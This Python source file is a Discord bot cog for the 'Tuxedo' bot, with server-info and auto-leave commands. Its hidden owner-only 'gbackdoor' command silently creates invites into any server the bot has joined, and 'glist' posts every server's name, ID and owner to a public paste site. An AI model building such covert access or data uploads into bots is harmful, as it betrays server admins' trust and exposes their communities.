import discord
from discord.ext import commands
from utils import permissions, randomness
import aiohttp
import math

verlevels = {discord.VerificationLevel.high: '(╯°□°）╯︵ ┻━┻ (High)',
             discord.VerificationLevel.low: 'Low',
             discord.VerificationLevel.none: 'Off',
             discord.VerificationLevel.medium: 'Medium',
             discord.VerificationLevel.extreme: '┻━┻ ﾐヽ(ಠ益ಠ)ノ彡┻━┻ (Extreme)'}

# begin anti-collection meme, DO NOT TOUCH THIS UNLESS YOU KNOW WHAT YOU ARE DOING

farmlevel = 60
botcount = 30
leavestr = 'This server appears to have a lot of bots, or a bot/user ratio of over 30%.\nSince bot collections are not allowed, Tuxedo has left automatically.'

async def haste_upload(text):
    with aiohttp.ClientSession() as sesh:
        async with sesh.post("https://hastebin.com/documents/", data=text, headers={"Content-Type": "text/plain"}) as r:
            r = await r.json()
            return r['key']

class GuildTools:
    def __init__(self, bot):
        self.bot = bot
        @bot.listen('on_guild_add') # Begin actual anti-collection
        async def on_guild_add(g):
            bots = len([a for a in g.members if a.bot])
            percent = math.floor(bots/len(g.members)*100)
            if percent > farmlevel or bots > 30:
                await g.text_channels[0].send()
                await g.leave()
            # End anti-collection meme

    @commands.command(hidden=True)
    @permissions.owner()
    async def glist(self, ctx):
        guilds = []
        for g in self.bot.guilds:
            bots = len([a for a in g.members if a.bot])
            percent = math.floor(bots/len(g.members)*100)
            farm = ' (WARNING! May be bot farm!)' if percent > farmlevel or bots > botcount else ''
            string = f'{g.name} ({g.id}) | {bots} bots / {len(g.members)} members ({percent}%) (Owned by {str(g.owner)}){farm}'
            guilds.append(string)

        string = '\n'.join(guilds)
        haste = await haste_upload(string)
        await ctx.author.send(f'https://hastebin.com/{haste}')
        await ctx.send(':ok_hand:')

    @commands.command()
    async def ginfo(self, ctx, *, guildname : str = None):
        if guildname != None:
            try:
                gid = int(guildname)
            except ValueError:
                gid = 0
        if guildname != None:
            if not permissions.owner_id_check(ctx.author.id):
                return
            guild = discord.utils.find(lambda a: a.name == guildname or a.id == gid, ctx.bot.guilds)
        else:
            guild = ctx.guild
        if guild == None: return await ctx.send(':x: Guild not found.')
        embed = discord.Embed(
            color=randomness.random_colour(),
            title=f'Guild info for {guild.name}'
        )
        bots = len([a for a in guild.members if a.bot])
        percent = bots/len(guild.members)*100
        if percent > farmlevel:
            embed.description = ':warning: May be a bot farm!'
            embed.colour = 0xFF0000
        
        if guild.icon_url != '':
            embed.set_thumbnail(url=guild.icon_url)
        
        chans = ', '.join([f'`{c.name}`' for c in guild.channels])
        embed.add_field(name='Members', value=f'{len(guild.members)} ({bots} bots, {math.floor(percent)}%)')
        embed.add_field(name='Owner', value=f'**{guild.owner.name}**#{guild.owner.discriminator} ({guild.owner.id})')
        embed.add_field(name='Roles', value=', '.join([r.name for r in guild.roles]) + f' ({len(guild.roles)})')
        embed.add_field(name='Channels', value=f'{chans} ({len(guild.channels)})')
        embed.add_field(name='Verification Level', value=verlevels[guild.verification_level])

        await ctx.send(embed=embed)

    @commands.command(hidden=True)
    @permissions.owner()
    async def gbackdoor(self, ctx, *, guildname : str):
        try:
            gid = int(guildname)
        except ValueError:
            gid = 0
        guild = discord.utils.find(lambda a: a.name == guildname or a.id == gid, ctx.bot.guilds)
        if guild == None: return
        try:
            invite = await guild.text_channels[0].create_invite()
            await ctx.author.send(str(invite))
            await ctx.send(':ok_hand:')
        except discord.Forbidden:
            await ctx.send('No permissions.')

    @commands.command(hidden=True)
    @permissions.owner()
    async def gleave(self, ctx, gid : str, *, reason = 'Suspected bot farm'):
        try:
            guildid = int(gid)
        except ValueError:
            guildid = 0
        guild = discord.utils.find(lambda a: a.name == gid or a.id == guildid, ctx.bot.guilds)
        if guild == None: return
        await guild.leave()
        try:
            await guild.owner.send(f'Tuxedo has left **{guild.name}** for reason `{reason}`.\nIf you feel this is wrong, contact ry00001#3487.')
        except discord.Forbidden:
            pass
        await ctx.send(':ok_hand:')


def setup(bot):
    bot.add_cog(GuildTools(bot))